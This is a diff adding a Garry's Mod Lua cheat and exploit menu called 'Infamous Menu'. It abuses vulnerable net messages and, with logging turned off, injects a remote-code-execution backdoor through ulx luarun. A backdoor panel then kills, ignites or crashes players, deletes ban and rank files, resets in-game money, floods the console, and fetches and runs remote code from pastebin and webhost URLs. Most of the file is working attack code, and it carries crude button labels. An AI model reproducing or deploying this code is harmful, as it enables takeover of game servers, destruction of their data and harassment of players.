@@ -1,0 +1,1033 @@
+surface.PlaySound("HL1/fvox/bell.wav")
+
+
+Version = "v1.2"
+netKey = "nostrip"
+
+totalExploits = 0
+BackdoorsFound = 0
+
+local ply = LocalPlayer()
+
+
+local blur = Material("pp/blurscreen")
+    local function DrawBlur(panel, amount) 
+    local x, y = panel:LocalToScreen(0, 0)
+    local scrW, scrH = ScrW(), ScrH()
+        surface.SetDrawColor(255, 255, 255)
+        surface.SetMaterial(blur)
+    for i = 1, 6 do
+        blur:SetFloat("$blur", (i / 3) * (amount or 6))
+        blur:Recompute()
+        render.UpdateScreenEffectTexture()
+        surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
+    end
+end
+
+function ValidNetString( str )
+    local status, error = pcall( net.Start, str )
+    return status
+end
+
+local function playSound(url)
+    sound.PlayURL(url, '', function( station ) 
+        if ( IsValid( station ) ) then
+        station:SetPos( LocalPlayer():GetPos() )
+        station:Play()
+        end
+    end)
+end
+
+hook.Add("Think", "RAINBOWPLAYER", function()
+local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
+    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
+    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
+end)
+
+function HtxPooledString()
+        if IsMessagePooled( netKey ) then return "Detected!"
+        else return "Not Detected!"
+    end
+end
+
+
+function IsMessagePooled( netmessage )
+    BackdoorStatus, error = pcall(net.Start,netmessage)
+    return BackdoorStatus
+end
+
+
+
+if( ValidNetString("start_wd_emp") ) then
+    totalExploits = 1 + totalExploits 
+end
+
+if( ValidNetString("properties") ) then
+    totalExploits = 1 + totalExploits
+end
+
+if( ValidNetString("egg") ) then
+    totalExploits = 1 + totalExploits
+end
+
+if( ValidNetString("steamid2") ) then
+    totalExploits = 1 + totalExploits
+end
+
+if( ValidNetString("bodyman_model_change") ) then
+    totalExploits = 1 + totalExploits
+end
+
+
+function SploitNotify(text)
+    local notify = vgui.Create( "DPanel" )
+    notify:SetSize( 200, 50 )
+    notify:SetPos( ScrW() - 200, -50 )
+    notify.Paint = function(self, w, h)
+    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
+    draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
+    draw.SimpleText( text, "Title", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+    end
+    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
+    timer.Simple( 3, function()
+    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
+end);end) end
+
+
+-- Exploit 1
+function removeAll()
+        for k,v in pairs(player.GetAll()) do
+            stripPlayer(v)
+        end
+    end
+
+    function removeAll()
+        for k,v in pairs(me:IsAdmin()) do
+            stripPlayer(v)
+        end
+    end
+
+    function removeAll()
+        for k,v in pairs(me:IsSuperAdmin()) do
+            stripPlayer(v)
+        end
+    end
+
+
+    function stripPlayer(ply)
+        if ply:IsPlayer() then
+ 
+            for k,v in pairs(ply:GetWeapons()) do
+
+                net.Start("properties")
+                net.WriteString( "remove" , 32 )
+                net.WriteEntity( v )
+                net.SendToServer()
+            end
+        end
+
+    end
+
+    function removeAll()
+        for k,v in pairs(player.GetAll()) do
+            stripPlayer(v)
+        end
+    end
+
+-- Exploit 2
+function HackKeypad()
+    net.Start('start_wd_emp') 
+    net.SendToServer()
+end
+
+-- Exploit 3
+
+function GiveEasterEgg1()
+    net.Start("egg")
+    net.SendToServer()
+    SploitNotify("Gave Easter Egg")
+
+end
+
+-- Exploit 4
+
+function Lagger1()
+    timer.Create( "lagger9", 0, 0, function()
+        for i = 1, 100 do
+        net.Start( "steamid2" )
+        net.WriteString( "Infamous Menu Boi" )
+        net.SendToServer()
+        end
+    end)
+end
+
+
+
+-- Superadmin Injector
+function Inject()
+    chat.AddText( Color( 0, 0, 0, 125 ), "[Infamous]", Color( 255, 255, 255 )," Injecting..." )
+    if ( ply:IsSuperAdmin() ) then
+        timer.Simple( 3, function() 
+            if( ValidNetString("nostrip") ) then
+            
+            else
+                RunConsoleCommand( "ulx", "logecho", "0" )
+                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('nostrip')" )
+                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('nostrip') net.Receive('nostrip', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
+                RunConsoleCommand( "ulx", "logecho", "1" )
+                chat.AddText( Color( 0, 0, 0, 125 ), "[Infamous]", Color( 0, 255, 0 )," Successfully Injected!" )
+            end
+        end )
+    else
+        chat.AddText( Color( 0, 0, 0, 125 ), "[Infamous]", Color( 255, 0, 0 )," Failed! Your Not Superadmin!" )
+    end
+    if( ValidNetString("nostrip") ) then
+        chat.AddText( Color( 0, 0, 0, 125 ), "[Infamous]", Color( 255, 255, 255 )," Backdoor is Active!" )
+    end
+end
+
+
+-- Fonts
+
+surface.CreateFont( "Title", {
+        font = "Lato Light",
+        size = 30,
+        weight = 250,
+        antialias = true,
+        strikeout = false,
+        additive = true,
+} )
+
+surface.CreateFont( "Status", {
+        font = "Lato Light",
+        size = 25,
+        weight = 250,
+        antiaalias = true,
+        strikeout = false,
+        additive = true,
+} )
+
+surface.CreateFont( "Welcome", {
+        font = "Lato Light",
+        size = 25,
+        weight = 10,
+        antiaalias = true,
+        strikeout = false,
+        additive = true,
+} )
+
+
+-- Menus Derma
+
+
+local Infamous = vgui.Create( "DFrame" )
+Infamous:SetSize( 630, 450 )
+Infamous:SetVisible( true )
+Infamous:SetDraggable( false )
+Infamous:ShowCloseButton( false )
+Infamous:Center()
+Infamous:SetTitle("")
+Infamous:MakePopup()
+Infamous.Paint = function( self, w, h )
+    DrawBlur(Infamous, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
+    draw.RoundedBox(0, 2, 2, w - 4, h / 9, Color(0,0,0,125))
+    draw.SimpleText( "Infamous Menu", "Title", Infamous:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
+end
+
+
+local InfamousCategories = vgui.Create( "DFrame", LOL )
+InfamousCategories:SetSize( 150, 450 )
+InfamousCategories:SetVisible( true )
+InfamousCategories:SetDraggable( false )
+InfamousCategories:ShowCloseButton( false )
+InfamousCategories:SetPos( 465, 315)
+InfamousCategories:SetTitle("")
+InfamousCategories:MakePopup()
+InfamousCategories.Paint = function( self, w, h )
+    DrawBlur(InfamousCategories, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
+    draw.RoundedBox(0, 2, 2, w - 4, h / 9, Color(0,0,0,125))
+    draw.SimpleText( "Categories", "Title", InfamousCategories:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
+end
+
+local InfamousClose = vgui.Create( "DButton", Infamous)
+InfamousClose:SetSize( 35, 35 )
+InfamousClose:SetPos( Infamous:GetWide() - 36,9 )
+InfamousClose:SetText( "X" )
+InfamousClose:SetFont( "Default" )
+InfamousClose:SetTextColor( Color( 255, 255, 255 ) )
+InfamousClose.Paint = function()
+        
+end
+InfamousClose.DoClick = function()
+    CloseEverything()
+end
+
+local WelcomeLabel = vgui.Create( "DLabel", Infamous )
+WelcomeLabel:SetPos( 100, 100 )
+WelcomeLabel:SetFont("Welcome")
+WelcomeLabel:SetText( "Hello,  "..ply:GetName().."\nThank you for using Infamous Menu! We will be \nUpdating our Menu so click the 'Check Version' Button to see \n if you have the right version :)")
+WelcomeLabel:SizeToContents()
+
+local TotalExploits = vgui.Create( "DLabel", Infamous )
+TotalExploits:SetPos( 230, 425 )
+TotalExploits:SetText( "Total Exploits: "..totalExploits.." |" )
+TotalExploits:SizeToContents()
+
+local BackdoorStatus = vgui.Create( "DLabel", Infamous )
+BackdoorStatus:SetPos( 320, 425 )
+BackdoorStatus:SetText( "Backdoor: "..HtxPooledString() )
+BackdoorStatus:SizeToContents()
+--
+if IsMessagePooled( netKey ) then BackdoorStatus:SetTextColor( Color(0,255,0) ) else BackdoorStatus:SetTextColor( Color(255,0,0) ) end
+--
+
+local VersionLabel = vgui.Create( "DLabel", Infamous )
+VersionLabel:SetPos( 550, 425 )
+VersionLabel:SetText( "Version: "..Version )
+
+local NameLabel = vgui.Create( "DLabel", Infamous )
+NameLabel:SetPos( 10, 425 )
+NameLabel:SetText( "Hello, "..ply:GetName().."!" )
+NameLabel:SizeToContents()
+
+-- Check Version Button
+
+
+local Checkversion = vgui.Create( "DButton", Infamous )
+Checkversion:SetText( "Check Version" )
+Checkversion:SizeToContents()
+Checkversion:SetTall( 25 )
+Checkversion:SetWide( 100 )
+Checkversion:SetPos( 250, 275 )
+Checkversion:SetTextColor( Color( 255, 255, 255 ) )
+Checkversion:SetToolTip( "Checks the Menus Version." )
+Checkversion.Paint = function( self, w, h )
+    DrawBlur(Checkversion, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+Checkversion.DoClick = function()
+    if ( Version == "v1.2") then
+            chat.AddText( Color( 0, 0, 0, 125 ), "[Infamous]", Color( 0, 255, 0 )," Version is up to date!" )
+    else
+            chat.AddText( Color( 0, 0, 0, 125 ), "[Infamous]", Color( 255, 0, 0 )," Out of date!" )
+    end
+    end
+end
+
+
+
+local BackdoorScanner = vgui.Create( "DButton", Infamous )
+BackdoorScanner:SetText( "Backdoor Scanner" )
+BackdoorScanner:SizeToContents()
+BackdoorScanner:SetTall( 25 )
+BackdoorScanner:SetWide( 100 )
+BackdoorScanner:SetPos( 185, 315 )
+BackdoorScanner:SetTextColor( Color( 255, 255, 255 ) )
+BackdoorScanner:SetToolTip( "Checks the server for Backdoors." )
+BackdoorScanner.Paint = function( self, w, h )
+    DrawBlur(BackdoorScanner, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+BackdoorScanner.DoClick = function()
+    SploitNotify("Scanning...")
+    surface.PlaySound("buttons/blip1.wav") 
+    checkbackdoors()
+
+    end
+end
+
+
+
+local Injector = vgui.Create( "DButton",Infamous )
+Injector:SetText( "Superadmin Injector" )
+Injector:SizeToContents()
+Injector:SetTall( 25 )
+Injector:SetWide( 115 )
+Injector:SetPos( 300, 315 )
+Injector:SetTextColor( Color( 255, 255, 255 ) )
+Injector:SetToolTip( "Injects Superadmin if the server is backdoored." )
+Injector.Paint = function( self, w, h )
+    DrawBlur(Injector, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+Injector.DoClick = function()
+    SploitNotify("Injecting...")
+    surface.PlaySound("buttons/blip1.wav") 
+    Inject()
+
+    end
+end
+
+
+
+
+local MainMenuButton = vgui.Create( "DButton", InfamousCategories )
+MainMenuButton:SetText( "Main Menu" )
+MainMenuButton:SizeToContents()
+MainMenuButton:SetTall( 50 )
+MainMenuButton:SetWide( MainMenuButton:GetWide() + 100 )
+MainMenuButton:SetPos( 0, 75 )
+MainMenuButton:SetTextColor( Color( 255, 255, 255 ) )
+MainMenuButton:SetToolTip( "Main Menu" )
+MainMenuButton.Paint = function( self, w, h )
+    DrawBlur(MainMenuButton, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+MainMenuButton.DoClick = function()
+        closealltabs()
+        ply:ConCommand( "infamous_menu" )
+    end
+end
+
+local ExploitMenuButton = vgui.Create( "DButton", InfamousCategories )
+ExploitMenuButton:SetText( "Exploit Menu" )
+ExploitMenuButton:SizeToContents()
+ExploitMenuButton:SetTall( 50 )
+ExploitMenuButton:SetWide( ExploitMenuButton:GetWide() + 100 )
+ExploitMenuButton:SetPos( 0, 140 )
+ExploitMenuButton:SetTextColor( Color( 255, 255, 255 ) )
+ExploitMenuButton:SetToolTip( "Exploit Menu" )
+ExploitMenuButton.Paint = function( self, w, h )
+    DrawBlur(ExploitMenuButton, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+ExploitMenuButton.DoClick = function()
+        closealltabs()
+        ply:ConCommand( "infamous_exploits" )
+    end
+end
+
+
+local BackdoorButton = vgui.Create( "DButton", InfamousCategories )
+BackdoorButton:SetText( "Backdoor Menu" )
+BackdoorButton:SizeToContents()
+BackdoorButton:SetTall( 50 )
+BackdoorButton:SetWide( BackdoorButton:GetWide() + 100 )
+BackdoorButton:SetPos( 0, 270 )
+BackdoorButton:SetTextColor( Color( 255, 255, 255 ) )
+BackdoorButton:SetToolTip( "bd menu" )
+BackdoorButton.Paint = function( self, w, h )
+    DrawBlur(BackdoorButton, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+BackdoorButton.DoClick = function()
+        closealltabs()
+        ply:ConCommand( "infamous_backdoor" )
+
+    end
+end
+
+
+
+local BackdoorMenu = vgui.Create( "DFrame" )
+BackdoorMenu:SetSize( 630, 450 )
+BackdoorMenu:SetVisible( true )
+BackdoorMenu:SetDraggable( false )
+BackdoorMenu:ShowCloseButton( false )
+BackdoorMenu:Center()
+BackdoorMenu:SetTitle("")
+BackdoorMenu:MakePopup()
+BackdoorMenu.Paint = function( self, w, h )
+    DrawBlur(BackdoorMenu, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
+    draw.RoundedBox(0, 2, 2, w - 4, h / 9, Color(0,0,0,125))
+    draw.SimpleText( "Infamous Backdoor Menu", "Title", BackdoorMenu:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
+    draw.SimpleText( "Macro Parameter", "Title", BackdoorMenu:GetWide() / 2, 225, Color(255,255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+end
+
+
+local BackdoorMenuClose = vgui.Create( "DButton", BackdoorMenu )
+BackdoorMenuClose:SetSize( 35, 35 )
+BackdoorMenuClose:SetPos( BackdoorMenu:GetWide() - 36,9 )
+BackdoorMenuClose:SetText( "X" )
+BackdoorMenuClose:SetFont( "Default" )
+BackdoorMenuClose:SetTextColor( Color( 255, 255, 255 ) )
+BackdoorMenuClose.Paint = function()
+
+end
+BackdoorMenuClose.DoClick = function()
+    CloseEverything()
+end
+
+
+
+
+
+local Consolerun = vgui.Create( "DTextEntry", BackdoorMenu )
+    Consolerun:SetText( strDefaultText or "" )
+    Consolerun:SetPos( 125, 100)
+    Consolerun:SetSize( 350, 20 )
+    Consolerun.OnEnter = function() Window:Close() Consolerun:GetValue() 
+end
+
+
+local RunCommand = vgui.Create( "DButton", BackdoorMenu )
+    RunCommand:SetText( "OK" )
+    RunCommand:SetSize( 55, 25 )
+    RunCommand:SetPos( 230, 150 )
+    RunCommand:SetTextColor( Color( 255, 255, 255 ) )
+    RunCommand.DoClick = function()  
+        SploitNotify("Sending Command")
+        surface.PlaySound("buttons/blip1.wav") 
+        net.Start( netKey )   net.WriteString( Consolerun:GetValue()  ) net.SendToServer() 
+ end
+
+RunCommand.Paint = function( self, w, h )
+    DrawBlur(RunCommand, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+end
+
+local Disco = vgui.Create( "DButton", BackdoorMenu )
+    Disco:SetText( "Hentai" )
+    Disco:SetSize( 55, 25 )
+    Disco:SetPos( 320, 150 )
+    Disco:SetTextColor( Color( 255, 255, 255 ) )
+    Disco.DoClick = 
+        function()  surface.PlaySound("buttons/blip1.wav") net.Start( netKey )   net.WriteString( Consolerun:GetValue()  ) net.SendToServer() 
+        SploitNotify("Starting Disco")
+        net.Start(netKey)
+        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/4yTWnEB4\",function(b,l,h,c)RunString(b)end,nil)" )
+        net.WriteBit(1)
+        net.SendToServer()
+end
+
+local Disco = vgui.Create( "DButton", BackdoorMenu )
+    Disco:SetText( "Slav" )
+    Disco:SetSize( 55, 25 )
+    Disco:SetPos( 400, 150 )
+    Disco:SetTextColor( Color( 255, 255, 255 ) )
+    Disco.DoClick = 
+        function()  surface.PlaySound("buttons/blip1.wav") net.Start( netKey )   net.WriteString( Consolerun:GetValue()  ) net.SendToServer() 
+        SploitNotify("Starting Disco")
+        net.Start(netKey)
+        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/tTPp8dU0\",function(b,l,h,c)RunString(b)end,nil)" )
+        net.WriteBit(1)
+        net.SendToServer()
+end
+
+Disco.Paint = function( self, w, h )
+    DrawBlur(Disco, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+end
+
+local Status = vgui.Create( "DLabel", BackdoorMenu )
+    Status:SetText("Status: "..HtxPooledString() )
+    Status:SetPos( 380,410 )
+    Status:SetFont("Status")
+    Status:SizeToContents()
+    Status:SetContentAlignment( 5 )
+    Status:SetTextColor( Color(255,50,50,255) )
+
+--
+if IsMessagePooled( netKey ) then Status:SetTextColor( Color(0,255,0) ) else Status:SetTextColor( Color(255,0,0) ) end
+--
+
+
+
+
+local KillEveryone = vgui.Create( "DButton", BackdoorMenu )
+    KillEveryone:SetText( "Kill Everyone" )
+    KillEveryone:SizeToContents()
+    KillEveryone:SetTall( 25 )
+    KillEveryone:SetWide( KillEveryone:GetWide() + 25 )
+    KillEveryone:SetPos( 50, 250 )
+    KillEveryone:SetTextColor( Color( 255, 255, 255 ) )
+    KillEveryone:SetToolTip( "Kills everyone in the server!" )
+    KillEveryone.Paint = function( self, w, h )
+        DrawBlur(KillEveryone, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    KillEveryone.DoClick = function()
+        SploitNotify("Killing Everyone")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        net.Start(netKey)
+        net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+local LaunchEveryone = vgui.Create( "DButton", BackdoorMenu )
+    LaunchEveryone:SetText( "Launch Everyone" )
+    LaunchEveryone:SizeToContents()
+    LaunchEveryone:SetTall( 25 )
+    LaunchEveryone:SetWide( LaunchEveryone:GetWide() + 20 )
+    LaunchEveryone:SetPos( 160, 250 )
+    LaunchEveryone:SetTextColor( Color( 255, 255, 255 ) )
+    LaunchEveryone:SetToolTip( "Launches everyone on the server" )
+    LaunchEveryone.Paint = function( self, w, h )
+        DrawBlur(LaunchEveryone, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    LaunchEveryone.DoClick = function()
+        SploitNotify("Launching Players")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        net.Start(netKey)
+        net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+
+local EarRape = vgui.Create( "DButton", BackdoorMenu )
+    EarRape:SetText( "Ear Rape" )
+    EarRape:SizeToContents()
+    EarRape:SetTall( 25 )
+    EarRape:SetWide( EarRape:GetWide() + 20 )
+    EarRape:SetPos( 285, 250 )
+    EarRape:SetTextColor( Color( 255, 255, 255 ) )
+    EarRape:SetToolTip( "Starts a very loud sound on the server." )
+    EarRape.Paint = function( self, w, h )
+        DrawBlur(EarRape, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    EarRape.DoClick = function()
+        SploitNotify("Starting Ear Rape")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        net.Start(netKey)
+        net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+
+local IngiteEveryone = vgui.Create( "DButton", BackdoorMenu )
+    IngiteEveryone:SetText( "Ignite Everyone" )
+    IngiteEveryone:SizeToContents()
+    IngiteEveryone:SetTall( 25 )
+    IngiteEveryone:SetWide( EarRape:GetWide() + 25 )
+    IngiteEveryone:SetPos( 370, 250 )
+    IngiteEveryone:SetTextColor( Color( 255, 255, 255 ) )
+    IngiteEveryone:SetToolTip( "Ignites Everyon on the server." )
+    IngiteEveryone.Paint = function( self, w, h )
+        DrawBlur(IngiteEveryone, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    IngiteEveryone.DoClick = function()
+        SploitNotify("Igniting Everyone")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        net.Start(netKey)
+        net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+
+local DeleteBans = vgui.Create( "DButton", BackdoorMenu )
+    DeleteBans:SetText( "Delete Bans" )
+    DeleteBans:SizeToContents()
+    DeleteBans:SetTall( 25 )
+    DeleteBans:SetWide( DeleteBans:GetWide() + 20 )
+    DeleteBans:SetPos( 480, 250 )
+    DeleteBans:SetTextColor( Color( 255, 255, 255 ) )
+    DeleteBans:SetToolTip( "Deletes all Bans!" )
+    DeleteBans.Paint = function( self, w, h )
+        DrawBlur(DeleteBans, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    DeleteBans.DoClick = function()
+        SploitNotify("Deleting Bans")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        net.Start(netKey)
+        net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+
+local DeleteRanks = vgui.Create( "DButton", BackdoorMenu )
+    DeleteRanks:SetText( "Delete ULX Ranks" )
+    DeleteRanks:SizeToContents()
+    DeleteRanks:SetTall( 25 )
+    DeleteRanks:SetWide( DeleteRanks:GetWide() + 20 )
+    DeleteRanks:SetPos( 50, 295 )
+    DeleteRanks:SetTextColor( Color( 255, 255, 255 ) )
+    DeleteRanks:SetToolTip( "Deletes ULX Groups / Ranks!" )
+    DeleteRanks.Paint = function( self, w, h )
+        DrawBlur(DeleteRanks, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    DeleteRanks.DoClick = function()
+        SploitNotify("Deleting ULX")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        net.Start(netKey)
+        net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+
+local ResetMoney = vgui.Create( "DButton", BackdoorMenu )
+    ResetMoney:SetText( "Reset RP Money" )
+    ResetMoney:SizeToContents()
+    ResetMoney:SetTall( 25 )
+    ResetMoney:SetWide( ResetMoney:GetWide() + 20 )
+    ResetMoney:SetPos( 180, 295 )
+    ResetMoney:SetTextColor( Color( 255, 255, 255 ) )
+    ResetMoney:SetToolTip( "Resets all DarkRP Money" )
+    ResetMoney.Paint = function( self, w, h )
+        DrawBlur(ResetMoney, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    ResetMoney.DoClick = function()
+        SploitNotify("Reseting Money")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        net.Start(netKey)
+        net.WriteString( "rp_resetallmoney")
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+
+local Seize = vgui.Create( "DButton", BackdoorMenu )
+    Seize:SetText( "Seize Server" )
+    Seize:SizeToContents()
+    Seize:SetTall( 25 )
+    Seize:SetWide( Seize:GetWide() + 20 )
+    Seize:SetPos( 300, 295 )
+    Seize:SetTextColor( Color( 255, 255, 255 ) )
+    Seize:SetToolTip( "Seizes the server lol." )
+    Seize.Paint = function( self, w, h )
+        DrawBlur(Seize, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    Seize.DoClick = function()
+        SploitNotify("Server Seized")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        net.Start(netKey)
+        net.WriteString( "http.Fetch(\"https://infamousseize.000webhostapp.com/index.php\",function(b,l,h,c)RunString(b)end,nil)"  )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+
+local crashcunts = vgui.Create( "DButton", BackdoorMenu )
+    crashcunts:SetText( "Crash Cunts" )
+    crashcunts:SizeToContents()
+    crashcunts:SetTall( 25 )
+    crashcunts:SetWide( crashcunts:GetWide() + 20 )
+    crashcunts:SetPos( 375, 295 )
+   crashcunts:SetTextColor( Color( 255, 255, 255 ) )
+    crashcunts:SetToolTip( "Crashes Admins/VIPS." )
+    crashcunts.Paint = function( self, w, h )
+        DrawBlur(crashcunts, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    crashcunts.DoClick = function()
+        SploitNotify("Crashing")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        local crash = "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end"
+        net.Start(netKey)
+        net.WriteString( crash )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+local miracle = vgui.Create( "DButton", BackdoorMenu )
+    miracle:SetText( "Ready for a miracle?" )
+    miracle:SizeToContents()
+    miracle:SetTall( 25 )
+    miracle:SetWide( miracle:GetWide() + 20 )
+    miracle:SetPos( 480, 295 )
+    miracle:SetTextColor( Color( 255, 255, 255 ) )
+    miracle:SetToolTip( "Are you Ready for a miracle?" )
+    miracle.Paint = function( self, w, h )
+        DrawBlur(miracle, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    miracle.DoClick = function()
+        SploitNotify("Miracle :D!")
+        surface.PlaySound("garrysmod/ui_click.wav")
+		local miraclerdy = "for k,v in pairs(player.GetAll()) do v:SendLua([[ local function playSound(url) sound.PlayURL(url, '', function( station ) if ( IsValid( station ) ) then station:SetPos( LocalPlayer():GetPos() ) station:Play() end end) end playSound('http://cyanidegang.000webhostapp.com/zyro/infamous/miracle.mp3')  ]]) end"
+        net.Start(netKey)
+        net.WriteString( miraclerdy )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+local miracle = vgui.Create( "DButton", BackdoorMenu )
+    miracle:SetText( "Don't Do Cocain?" )
+    miracle:SizeToContents()
+    miracle:SetTall( 25 )
+    miracle:SetWide( miracle:GetWide() + 20 )
+    miracle:SetPos( 480, 350 )
+    miracle:SetTextColor( Color( 255, 255, 255 ) )
+    miracle:SetToolTip( "DON'T DO COCAIN" )
+    miracle.Paint = function( self, w, h )
+        DrawBlur(miracle, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    miracle.DoClick = function()
+        SploitNotify("No Cocain !")
+        surface.PlaySound("garrysmod/ui_click.wav")
+		local miraclerdy = "for k,v in pairs(player.GetAll()) do v:SendLua([[ local function playSound(url) sound.PlayURL(url, '', function( station ) if ( IsValid( station ) ) then station:SetPos( LocalPlayer():GetPos() ) station:Play() end end) end playSound('https://instaud.io/_/1R1P.mp3')  ]]) end"
+        net.Start(netKey)
+        net.WriteString( miraclerdy )
+        net.WriteBit(1)
+        net.SendToServer()
+
+    end 
+end
+
+-- Concommand Functions 
+
+function EarthQuake()
+local earths = "for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end"
+net.Start(netKey)
+net.WriteString( earths )
+net.WriteBit(1)
+net.SendToServer()
+end
+
+concommand.Add("earthquake", EarthQuake)
+
+-- ConCommand Functions End
+
+
+local FloodConsole = vgui.Create( "DButton", BackdoorMenu )
+    FloodConsole:SetText( "Flood Console" )
+    FloodConsole:SizeToContents()
+    FloodConsole:SetTall( 25 )
+    FloodConsole:SetWide( FloodConsole:GetWide() + 20 )
+    FloodConsole:SetPos( 50, 340 )
+    FloodConsole:SetTextColor( Color( 255, 255, 255 ) )
+    FloodConsole:SetToolTip( "Floods Server Console" )
+    FloodConsole.Paint = function( self, w, h )
+        DrawBlur(FloodConsole, 2)
+        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
+    FloodConsole.DoClick = function()
+        SploitNotify("Flooding Console")
+        surface.PlaySound("garrysmod/ui_click.wav")
+        net.Start(netKey)
+        net.WriteString( "timer.Create( \"adminsgonnahate\", 0.05, 0, function() print(\"0100101001001010101001011010101010001010101001010100100010101010111000110010101001010010010101010010110101010100010101010010101001000101010101110001100101010010100100101010100101101010101000101010100101010010001010101011100011001010100101001001010101001011010101010001010101001010100100010101010111000110010101001010010010101010010110101010100010101010010101001000101010101110001100101010010100100101010100101101010101000101010100101010010001010101011100011001010100101001001010101001011010101010001010101001010100100010101010111000110010101001010010010101010010110101010100010101010010101001000101010101110001100101\") end )" )
+        net.WriteBit(1)
+        net.SendToServer()
+    end
+end
+
+
+
+-- Exploit Derma
+
+local ExploitMenu = vgui.Create( "DFrame" )
+ExploitMenu:SetSize( 630, 450 )
+ExploitMenu:SetVisible( true )
+ExploitMenu:SetDraggable( false )
+ExploitMenu:ShowCloseButton( false )
+ExploitMenu:Center()
+ExploitMenu:SetTitle("")
+ExploitMenu:MakePopup()
+ExploitMenu.Paint = function( self, w, h )
+    DrawBlur(ExploitMenu, 2)
+    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
+    draw.RoundedBox(0, 2, 2, w - 4, h / 9, Color(0,0,0,125))
